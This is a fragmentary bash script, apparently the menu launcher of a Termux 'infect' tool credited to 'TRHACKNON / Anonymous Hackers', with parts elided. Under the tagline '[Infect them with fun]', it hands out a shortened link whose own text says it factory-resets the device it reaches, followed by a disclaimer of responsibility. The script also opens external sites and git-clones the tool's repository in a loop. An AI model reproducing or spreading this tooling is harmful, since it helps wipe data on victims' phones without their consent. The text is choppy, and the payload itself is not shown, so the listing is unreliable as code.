...
'
echo " " 
echo -e "$red                       ▶Coded by$grn TRHACKNON$red◀$rset"
echo -e "$red                      ⫸$ylo  ANONYMOUS$red ⫷$rset"
echo 
# Functions
...
echo " " 
echo -e "$red                       ▶Coded by$grn TRHACKNON$red◀$rset"
echo -e "$red                      ⫸$ylo  ANONYMOUS Hackers$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Infect them with fun]$rset"
echo " "
...
then
am start -a android.intent.action.VIEW -d http://crashbookpro.cf > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://www.github.com/trhacknon > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
...
device it will be factory reset and lot more happens.
         ...
         \e[92mL1NK :- \e[96mhttps://myurlshorter.000webhostapp.com/a3kv8yx3b\e[91m

                                 👆👆👆
TRHACKNON's responsability can't engaged
...
echo -e '\e[91m
         ...
         ────▌──▐────
'
echo -e "\e[93m                  CALL ME \e[92mTRHACKNON" | pv -qL 10
echo -e "\e[93m             IAM FROM \e[92mANONYMOUS HACKERS" | pv -qL 10
...
echo -e "\e[93m        MY WEBSITE:\e[92m www.memanon.ml\e[0m" | pv -qL 10
...
while git clone https://github.com/trhacknon/infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
